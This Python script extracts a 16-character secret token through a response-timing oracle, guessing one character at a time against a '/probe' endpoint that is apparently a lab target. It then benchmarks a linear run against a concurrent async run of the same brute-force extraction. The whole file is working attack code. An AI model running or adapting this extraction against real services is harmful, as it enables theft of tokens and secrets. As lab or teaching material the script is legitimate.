import argparse
import asyncio
import string
import time

import httpx

TOKEN_LENGTH = 16
CHARSET = string.ascii_letters + string.digits
SLEEP_DELAY = 0.2


# -----------------------
# Oracle helpers
# -----------------------


def oracle_linear(client: httpx.Client, url: str, pos: int, char: str) -> bool:
    start = time.perf_counter()
    client.get(url, params={"pos": pos, "char": char})
    return (time.perf_counter() - start) > SLEEP_DELAY


async def oracle_async(
    client: httpx.AsyncClient, url: str, pos: int, char: str
) -> bool:
    start = time.perf_counter()
    await client.get(url, params={"pos": pos, "char": char})
    return (time.perf_counter() - start) > SLEEP_DELAY


# -----------------------
# Linear extraction
# -----------------------


def extract_token_linear(base_url: str) -> str:
    token = []
    with httpx.Client(timeout=5.0) as client:
        for pos in range(TOKEN_LENGTH):
            for char in CHARSET:
                if oracle_linear(client, base_url, pos, char):
                    token.append(char)
                    break
    return "".join(token)


# -----------------------
# Async extraction
# -----------------------


async def extract_token_async(base_url: str, concurrency: int) -> str:
    token = ["?"] * TOKEN_LENGTH
    sem = asyncio.Semaphore(concurrency)

    async with httpx.AsyncClient(timeout=5.0) as client:

        async def try_char(pos: int, char: str):
            async with sem:
                if await oracle_async(client, base_url, pos, char):
                    return char
            return None

        for pos in range(TOKEN_LENGTH):
            tasks = [asyncio.create_task(try_char(pos, c)) for c in CHARSET]
            for coro in asyncio.as_completed(tasks):
                result = await coro
                if result:
                    token[pos] = result
                    for t in tasks:
                        t.cancel()
                    break

    return "".join(token)


# -----------------------
# Benchmark runner
# -----------------------


async def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True, help="http://host:port/probe")
    parser.add_argument("--runs", type=int, default=10)
    parser.add_argument("--concurrency", type=int, default=20)
    args = parser.parse_args()

    linear_times = []
    async_times = []

    for i in range(1, args.runs + 1):
        print(f"\n--- Run {i}/{args.runs} ---")

        start = time.perf_counter()
        linear_token = extract_token_linear(args.target)
        linear_time = time.perf_counter() - start
        linear_times.append(linear_time)

        print(f"[+] Linear: {linear_time:.2f}s → {linear_token}")

        start = time.perf_counter()
        async_token = await extract_token_async(args.target, args.concurrency)
        async_time = time.perf_counter() - start
        async_times.append(async_time)

        print(f"[+] Async:  {async_time:.2f}s → {async_token}")

    print("\n=== Summary ===")
    print(f"Linear avg: {sum(linear_times) / len(linear_times):.2f}s")
    print(f"Async  avg: {sum(async_times) / len(async_times):.2f}s")
    print(f"Speedup: {(sum(linear_times) / sum(async_times)):.2f}×")


if __name__ == "__main__":
    asyncio.run(main())
